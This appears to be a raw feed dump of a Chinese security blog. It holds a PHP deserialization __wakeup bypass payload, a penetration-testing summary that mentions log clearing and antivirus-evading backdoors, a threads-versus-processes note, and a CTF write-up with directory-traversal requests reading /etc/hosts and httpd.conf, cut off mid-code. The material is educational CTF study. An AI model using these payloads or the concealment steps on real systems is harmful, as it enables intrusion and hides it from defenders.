<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line">pubilc <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 序列化输出结果为：</span></span><br><span class="line"><span class="comment">// O:4:&quot;test&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;123&quot;;&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>正常结果输入时，会执行__wakeup()，从而输出’bad requests’，并退出脚本，因此利用漏洞绕过__wakeup()。</p>
<p>将序列化字符串中<font color="red">代表变量个数的数字</font>改为大于其真实值的数字，并进行POST请求，得到flag。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>code audit</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透总结学习笔记（误</title>
    <url>/yakko117/2019/09/12/%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz572tahj31hc0u0qpx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz572tahj31hc0u0qpx.jpg" class="lazyload"></a></p>
<p>省护网十天的摸鱼结束了，然后拖到现在才开始写总结</p>
<span id="more"></span>
<h1 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h1><p>几乎占据渗透过程的70%-80%。<br>资产收集思路如下：<br>主站 –&gt; （真实IP） –&gt; 子站&#x2F;旁站&#x2F;C段 –&gt; 敏感信息收集 –&gt; 目标系统后台</p>
<h2 id="主域名信息"><a href="#主域名信息" class="headerlink" title="主域名信息"></a>主域名信息</h2><h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>kali 可直接进行 <code>whois</code>查询</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:~# whois baidu.com</span><br><span class="line"> </span><br><span class="line">Whois Server Version 2.0</span><br><span class="line"> </span><br><span class="line">Domain names in the .com and .net domains can now be registered</span><br><span class="line">with many different competing registrars. Go to http://www.internic.net</span><br><span class="line">for detailed information.</span><br><span class="line"></span><br><span class="line">Domain Name: baidu.com</span><br><span class="line">Registry Domain ID: 11181110_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.markmonitor.com</span><br><span class="line">Registrar URL: http://www.markmonitor.com</span><br><span class="line">Updated Date: 2019-05-08T20:59:33-0700</span><br><span class="line">Creation Date: 1999-10-11T04:05:17-0700</span><br><span class="line">Registrar Registration Expiration Date: 2026-10-11T00:00:00-0700</span><br><span class="line">Registrar: MarkMonitor, Inc.</span><br><span class="line">Registrar IANA ID: 292</span><br><span class="line">Registrar Abuse Contact Email: email@markmonitor.com</span><br><span class="line">Registrar Abuse Contact Phone: +1.2083895740</span><br><span class="line">Domain Status: clientUpdateProhibited (https://www.icann.org/epp#clientUpdateProhibited)</span><br><span class="line">Domain Status: clientTransferProhibited (https://www.icann.org/epp#clientTransferProhibited)</span><br><span class="line">Domain Status: clientDeleteProhibited (https://www.icann.org/epp#clientDeleteProhibited)</span><br><span class="line">Domain Status: serverUpdateProhibited (https://www.icann.org/epp#serverUpdateProhibited)</span><br><span class="line">Domain Status: serverTransferProhibited (https://www.icann.org/epp#serverTransferProhibited)</span><br><span class="line">Domain Status: serverDeleteProhibited (https://www.icann.org/epp#serverDeleteProhibited)</span><br><span class="line">Registrant Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span><br><span class="line">Registrant State/Province: Beijing</span><br><span class="line">Registrant Country: CN</span><br><span class="line">Admin Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span><br><span class="line">Admin State/Province: Beijing</span><br><span class="line">Admin Country: CN</span><br><span class="line">Tech Organization: Beijing Baidu Netcom Science Technology Co., Ltd.</span><br><span class="line">Tech State/Province: Beijing</span><br><span class="line">Tech Country: CN</span><br><span class="line">Name Server: ns4.baidu.com</span><br><span class="line">Name Server: ns2.baidu.com</span><br><span class="line">Name Server: ns1.baidu.com</span><br><span class="line">Name Server: ns3.baidu.com</span><br><span class="line">Name Server: ns7.baidu.com</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line">URL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/</span><br><span class="line">&gt;&gt;&gt; Last update of WHOIS database: 2019-09-07T14:24:11-0700 &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">For more information on WHOIS status codes, please visit:</span><br><span class="line">  https://www.icann.org/resources/pages/epp-status-codes</span><br><span class="line"></span><br><span class="line">If you wish to contact this domain’s Registrant, Administrative, or Technical</span><br><span class="line">contact, and such email address is not visible above, you may do so via our web</span><br><span class="line">form, pursuant to ICANN’s Temporary Specification. To verify that you are not a</span><br><span class="line">robot, please enter your email address to receive a link to a page that</span><br><span class="line">facilitates email communication with the relevant contact(s).</span><br><span class="line"></span><br><span class="line">Web-based WHOIS:</span><br><span class="line">  https://domains.markmonitor.com/whois</span><br><span class="line"></span><br><span class="line">If you have a legitimate interest in viewing the non-public WHOIS details, send</span><br><span class="line">your request and the reasons for your request to email@markmonitor.com</span><br><span class="line">and specify the domain name in the subject line. We will review that request and</span><br><span class="line">may ask for supporting documentation and explanation.</span><br><span class="line"></span><br><span class="line">The data in MarkMonitor’s WHOIS database is provided for information purposes,</span><br><span class="line">and to assist persons in obtaining information about or related to a domain</span><br><span class="line">name’s registration record. While MarkMonitor believes the data to be accurate,</span><br><span class="line">the data is provided &quot;as is&quot; with no guarantee or warranties regarding its</span><br><span class="line">accuracy.</span><br><span class="line"></span><br><span class="line">By submitting a WHOIS query, you agree that you will use this data only for</span><br><span class="line">lawful purposes and that, under no circumstances will you use this data to:</span><br><span class="line">  (1) allow, enable, or otherwise support the transmission by email, telephone,</span><br><span class="line">or facsimile of mass, unsolicited, commercial advertising, or spam; or</span><br><span class="line">  (2) enable high volume, automated, or electronic processes that send queries,</span><br><span class="line">data, or email to MarkMonitor (or its systems) or the domain name contacts (or</span><br><span class="line">its systems).</span><br><span class="line"></span><br><span class="line">MarkMonitor.com reserves the right to modify these terms at any time.</span><br><span class="line"></span><br><span class="line">By submitting this query, you agree to abide by this policy.</span><br><span class="line"></span><br><span class="line">MarkMonitor is the Global Leader in Online Brand Protection.</span><br><span class="line"></span><br><span class="line">MarkMonitor Domain Management(TM)</span><br><span class="line">MarkMonitor Brand Protection(TM)</span><br><span class="line">MarkMonitor AntiCounterfeiting(TM)</span><br><span class="line">MarkMonitor AntiPiracy(TM)</span><br><span class="line">MarkMonitor AntiFraud(TM)</span><br><span class="line">Professional and Managed Services</span><br><span class="line"></span><br><span class="line">Visit MarkMonitor at https://www.markmonitor.com</span><br><span class="line">Contact us at +1.8007459229</span><br><span class="line">In Europe, at +44.02032062220</span><br></pre></td></tr></table></figure></div>

<p>一些在线whois查询网站：<br>爱站：<a href="http://old.whois.aizhan.com/">http://old.whois.aizhan.com</a><br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>VirusTotal:<a href="https://www.virustotal.com/">https://www.virustotal.com/</a></p>
<hr>
<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><p>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
<p>从主域名出发，然后需要考虑的是子域名，比如<code>*.xxx.com</code> ，接下来进行子域名搜集思路的梳理。</p>
<hr>
<h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><h3 id="A-搜索引擎查询"><a href="#A-搜索引擎查询" class="headerlink" title="A.搜索引擎查询"></a>A.搜索引擎查询</h3><p>Google、baidu、Bing等传统搜索引擎<br>使用 google hacker 语法</p>
<table>
<thead>
<tr>
<th align="left">关键字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">site</td>
<td align="left">指定域名</td>
</tr>
<tr>
<td align="left">inurl</td>
<td align="left">URL中包含指定的关键字的网页</td>
</tr>
<tr>
<td align="left">intext</td>
<td align="left">指定网页中的关键字</td>
</tr>
<tr>
<td align="left">filetype</td>
<td align="left">指定文件类型</td>
</tr>
<tr>
<td align="left">intitle</td>
<td align="left">网页标题中的关键字</td>
</tr>
<tr>
<td align="left">link</td>
<td align="left">返回合指定URL做了链接的URL</td>
</tr>
<tr>
<td align="left">info</td>
<td align="left">查找指定站点的基本信息</td>
</tr>
<tr>
<td align="left">cache</td>
<td align="left">搜索google里关于某些内容的缓存</td>
</tr>
</tbody></table>
<p>网络空间安全搜索引擎</p>
<p>zoomeye(钟馗之眼)：<a href="https://www.zoomeye.org/">https://www.zoomeye.org</a><br>shodan：<a href="https://www.shodan.io/">https://www.shodan.io</a><br>Fofa：<a href="https://fofa.so/">https://fofa.so</a> (推荐）<br>域名查询网：<a href="https://site.ip138.com/">https://site.ip138.com</a> （推荐）<br>w3techs：<a href="https://w3techs.com/sites">https://w3techs.com/sites</a></p>
<p>PS：也可编写Python脚本批量查询、获取</p>
<hr>
<h3 id="B-在线查询接口"><a href="#B-在线查询接口" class="headerlink" title="B.在线查询接口"></a>B.在线查询接口</h3><p><a href="http://tool.chinaz.com/subdomain/">http://tool.chinaz.com/subdomain/</a><br><a href="http://i.links.cn/subdomain/">http://i.links.cn/subdomain/</a><br><a href="http://subdomain.chaxun.la/">http://subdomain.chaxun.la/</a><br><a href="http://searchdns.netcraft.com/">http://searchdns.netcraft.com/</a><br><a href="https://www.virustotal.com/">https://www.virustotal.com/</a><br><a href="https://censys.io/">https://censys.io/</a><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> 微步在线</p>
<hr>
<h3 id="C-子域名暴力猜解"><a href="#C-子域名暴力猜解" class="headerlink" title="C.子域名暴力猜解"></a>C.子域名暴力猜解</h3><p>爆破工具：<br>Layer子域名挖掘机<br>wydomain：<a href="https://github.com/ring04h/wydomain">https://github.com/ring04h/wydomain</a><br>subDomainsBrute:<a href="https://github.com/lijiejie/">https://github.com/lijiejie/</a><br>Sublist3r:<a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a><br>御剑后台扫描<br>明小子注入</p>
<hr>
<h3 id="D-DNS查询-x2F-枚举"><a href="#D-DNS查询-x2F-枚举" class="headerlink" title="D.DNS查询&#x2F;枚举"></a>D.DNS查询&#x2F;枚举</h3><p>DNS查询：<br>host -t a domainName<br>host -t mx domainName</p>
<p>优点：非常直观，通过查询DNS服务器的A记录、CNAME等，可以准确得到相关信息，较全。<br>缺点：有很大的局限性，很多DNS是禁止查询的。<br>参考：<a href="https://www.cnblogs.com/xuanhun/p/3489038.html">https://www.cnblogs.com/xuanhun/p/3489038.html</a></p>
<p>域传送漏洞</p>
<p>DNS暴力破解：fierce<br>参考链接：<a href="http://blog.csdn.net/jeanphorn/article/details/44987549">http://blog.csdn.net/jeanphorn/article/details/44987549</a></p>
<p>Passive DNS<br>参考链接：<a href="http://www.freebuf.com/articles/network/103815.html">http://www.freebuf.com/articles/network/103815.html</a></p>
<hr>
<h3 id="E-HTTPS证书"><a href="#E-HTTPS证书" class="headerlink" title="E.HTTPS证书"></a>E.HTTPS证书</h3><p>证书颁发机构(CA)必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中。SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。因此SSL&#x2F;TLS证书成为了攻击者的切入点。</p>
<p>SSL证书搜索引擎：<br><a href="https://certdb.com/domain/github.com">https://certdb.com/domain/github.com</a><br><a href="https://crt.sh/?Identity=%25%25.github.com">https://crt.sh/?Identity=%%.github.com</a><br><a href="https://censys.io/">https://censys.io/</a></p>
<p>基于 HTTPS 证书的子域名收集小程序 ：GetDomainsBySSL.py<br>参考链接：<a href="http://www.freebuf.com/articles/network/140738.html">http://www.freebuf.com/articles/network/140738.html</a></p>
<hr>
<h3 id="F-综合搜索"><a href="#F-综合搜索" class="headerlink" title="F.综合搜索"></a>F.综合搜索</h3><p>提莫：<a href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a><br>主要有三大模块：搜索引擎 第三方站点 枚举 </p>
<p>利用全网IP扫描http端口 在访问IP的80或者8080端口的时候，可能会遇到配置了301跳转的，可以在header里获取域名信息。<br>全网扫描结果如下：<a href="https://scans.io/study/sonar.http">https://scans.io/study/sonar.http</a></p>
<p>然后附上思维导图<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56umvsj31860njgo2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56umvsj31860njgo2.jpg" class="lazyload"></a></p>
<hr>
<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>学会使用各种技能去进行漏洞挖掘<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56x3mdj31c60u0n2u.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56x3mdj31c60u0n2u.jpg" class="lazyload"></a></p>
<hr>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>从不同方式寻找POC，学会查看中间件，利用工具，或者自己编写攻击脚本<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56tjsuj30xn0k1wge.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g6wz56tjsuj30xn0k1wge.jpg" class="lazyload"></a></p>
<hr>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>进入后台后，上传webshell 却执行不了，就要想办法提权<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56tbilj31ez0lkn0e.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56tbilj31ez0lkn0e.jpg" class="lazyload"></a></p>
<hr>
<h1 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h1><p>然后要注意擦出痕迹，防止水表<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56s22nj30tp0eiq3x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56s22nj30tp0eiq3x.jpg" class="lazyload"></a></p>
<hr>
<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><p>利用后门的时候，也要学会免杀，和擦痕迹<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56smryj30q30e9js3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g6wz56smryj30q30e9js3.jpg" class="lazyload"></a></p>
<hr>
<h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>准备多花时间康康新的CVE，自己最近还有几个CMS要看，这周再花点时间来看一下CVE-2019-0708，然后更一篇吧。</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>线程和进程的区别（学习）</title>
    <url>/yakko117/2019/07/25/%E7%BA%BF%E7%A8%8B%E4%B8%8E%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="线程和进程的区别"><a href="#线程和进程的区别" class="headerlink" title="线程和进程的区别"></a>线程和进程的区别</h1><h2 id="1、进程是什么？"><a href="#1、进程是什么？" class="headerlink" title="1、进程是什么？"></a>1、进程是什么？</h2><p>是具有一定独立功能的程序、它是系统进行资源分配和调度的一个独立单位，重点在系统调度和单独的单位，也就是说进程是可以独立运行的一段程序。    </p>
<h2 id="2、线程又是什么？"><a href="#2、线程又是什么？" class="headerlink" title="2、线程又是什么？"></a>2、线程又是什么？</h2><p>线程进程的一个实体，是CPU调度和分派的基本单位，他是比进程更小的能独立运行的基本单位，线程自己基本上不拥有系统资源。在运行时，只是暂用一些计数器、寄存器和栈 。</p>
<ul>
<li>进程(程序)：是静态概念，一个class文件、一个exe文件</li>
<li>线程：是一个程序里面不同的执行路径</li>
<li><a href="https://www.cnblogs.com/zhehan54/p/6130030.html">参考CSDN</a></li>
</ul>
<hr>
<h2 id="它们之间的关系"><a href="#它们之间的关系" class="headerlink" title="它们之间的关系"></a>它们之间的关系</h2><ul>
<li>1、一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程（通常说的主线程）。</li>
<li>2、资源分配给进程，同一进程的所有线程共享该进程的所有资源。</li>
<li>3、线程在执行过程中，需要协作同步。不同进程的线程间要利用消息通信的办法实现同步。   </li>
<li>4、处理机分给线程，即真正在处理机上运行的是线程。   </li>
<li>5、线程是指进程内的一个执行单元，也是进程内的可调度实体。</li>
</ul>
<hr>
<h1 id="进程与线程的资源"><a href="#进程与线程的资源" class="headerlink" title="进程与线程的资源"></a>进程与线程的资源</h1><h2 id="堆与栈"><a href="#堆与栈" class="headerlink" title="堆与栈"></a>堆与栈</h2><ol>
<li><p>堆是大家共有的空间，分全局堆和局部堆。全局堆就是所有没有分配的空间，局部堆就是用户分配的空间。堆在操作系统对进程初始化的时候分配，运行过程中也可以向系统要额外的堆，但是记得用完了要还给操作系统，要不然就是内存泄漏。</p>
</li>
<li><p>栈是个线程独有的，保存其运行状态和局部自动变量的。栈在线程开始的时候初始化，每个线程的栈互相独立，因此，栈是 <code>thread safe</code>的。操作系统在切换线程的时候会自动的切换栈，就是切换 <code>ＳＳ／ＥＳＰ</code>寄存器。栈空间不需要在高级语言里面显式的分配和释放。</p>
</li>
</ol>
<hr>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>线程共享的环境包括：进程代码段、进程的公有数据(利用这些共享的数据，线程很容易的实现相互之间的通讯)、进程打开的文件描述符、信号的处理器、进程的当前目录和进程用户ID与进程组ID。<br>进程拥有这许多共性的同时，还拥有自己的个性。有了这些个性，线程才能实现并发性。这些个性包括：</p>
<h3 id="1-线程ID"><a href="#1-线程ID" class="headerlink" title="1.线程ID"></a>1.线程ID</h3><p>每个线程都有自己的线程ID，这个ID在本进程中是唯一的。<br>进程用此来标识线程。</p>
<hr>
<h3 id="2-寄存器组的值"><a href="#2-寄存器组的值" class="headerlink" title="2.寄存器组的值"></a>2.寄存器组的值</h3><p>由于线程间是并发运行的，每个线程有自己不同的运行线索，<br>当从一个线程切换到另一个线程上时，必须将原有的线程的寄存器集合的状态保存，<br>以便将来该线程在被重新切换到时能得以恢复。</p>
<hr>
<h3 id="3-线程的堆栈"><a href="#3-线程的堆栈" class="headerlink" title="3.线程的堆栈"></a>3.线程的堆栈</h3><p>堆栈是保证线程独立运行所必须的。<br>线程函数可以调用函数，而被调用函数中又是可以层层嵌套的，<br>所以线程必须拥有自己的函数堆栈，使得函数调用可以正常执行，<br>不受其他线程的影响。</p>
<hr>
<h3 id="4-错误返回码"><a href="#4-错误返回码" class="headerlink" title="4.错误返回码"></a>4.错误返回码</h3><p>由于同一个进程中有很多个线程在同时运行，可能某个线程进行系统调用<br>后设置了errno值，而在该线程还没有处理这个错误，另外一个线程就在此时<br>被调度器投入运行，这样错误值就有可能被修改。<br>所以，不同的线程应该拥有自己的错误返回码变量。</p>
<hr>
<h3 id="5-线程的信号屏蔽码"><a href="#5-线程的信号屏蔽码" class="headerlink" title="5.线程的信号屏蔽码"></a>5.线程的信号屏蔽码</h3><p>由于每个线程所感兴趣的信号不同，<br>所以线程的信号屏蔽码应该由线程自己管理。<br>但所有的线程都共享同样的信号处理器。</p>
<hr>
<h3 id="6-线程的优先级"><a href="#6-线程的优先级" class="headerlink" title="6.线程的优先级"></a>6.线程的优先级</h3><p>由于线程需要像进程那样能够被调度，<br>那么就必须要有可供调度使用的参数，这个参数就是线程的优先级。<br><a href="https://blog.csdn.net/shuilan0066/article/details/7683315">参考CSDN</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>瞎扯</tag>
      </tags>
  </entry>
  <entry>
    <title>2019年安恒西湖周周练 web篇</title>
    <url>/yakko117/2019/04/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%91%A8%E5%91%A8%E7%BB%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>无法去西湖划水的我，只能做做周周练来水一期blog<br>安恒月赛地址：<a href="https://www.linkedbyx.com/">https://www.linkedbyx.com</a></p>
<h2 id="web-01-AppScan"><a href="#web-01-AppScan" class="headerlink" title="web-01 AppScan"></a>web-01 AppScan</h2><p>某公司的网站遭受到黑客攻击，存放在Apache配置文件中的重要信息被黑客盗取了。公司员工为了验证成因，使用明鉴Web应用弱点扫描器扫描网站并导出漏洞报告，你能通过分析漏洞报告得出黑客可能是采用哪种漏洞盗取重要信息的么？被盗取的重要信息是什么？</p>
<p>查看 <strong>MatriXayWeb应用安全评估报告</strong> 发现存在漏洞<strong>目录遍历</strong><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2vcwj30pn080t9a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2vcwj30pn080t9a.jpg" class="lazyload"></a><br>测试案例</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://101.71.29.5:10009/index.php?act=about&amp;file=/etc/hosts</span><br><span class="line">回显</span><br><span class="line">127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4 ::1 localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br></pre></td></tr></table></figure></div>
<p>根据题意知道漏洞为Apache配置文件<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k1omxj30ef06r74b.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k1omxj30ef06r74b.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://101.71.29.5:10009/index.php?act=about&amp;file=/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure></div>
<p>得到flag<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k30rvj30gy056wf3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k30rvj30gy056wf3.jpg" class="lazyload"></a></p>
<hr>
<h2 id="web-02-Dota"><a href="#web-02-Dota" class="headerlink" title="web-02 Dota"></a>web-02 Dota</h2><p>无论你喜欢打Dota还是LOL，都进网站里学习一下吧！<br>qvq 这个题目我猜原来是打算用命令执行和文件包含漏洞绕过过滤得到flag<br>结果直接被我御剑扫出来了 orz</p>
<hr>
<h2 id="web-03-美男子"><a href="#web-03-美男子" class="headerlink" title="web-03 美男子"></a>web-03 美男子</h2><p>我还是想安静的做一个美男子！</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2cs4j30g4092gm0.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k2cs4j30g4092gm0.jpg" class="lazyload"></a></p>
<p>查看源代码， 发现tips </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--index.phps--&gt;</span><br></pre></td></tr></table></figure></div>
<p>进入 index.phps,查看源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;global.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span>(<span class="params"><span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$StrValue</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$StrValue</span>=<span class="title function_ invoke__">implode</span>(<span class="variable">$StrValue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrtValue</span>)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;holy shit!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;union|select|from|where|join|sleep|benchmark|,|\(|\)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </span><br><span class="line">    <span class="title function_ invoke__">AttackFilter</span>(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key1&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;DBAPP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img src=&#x27;image/img.jpg&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;!--index.phps--&gt;</span></span><br><span class="line"><span class="string">DBAPP</span>;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 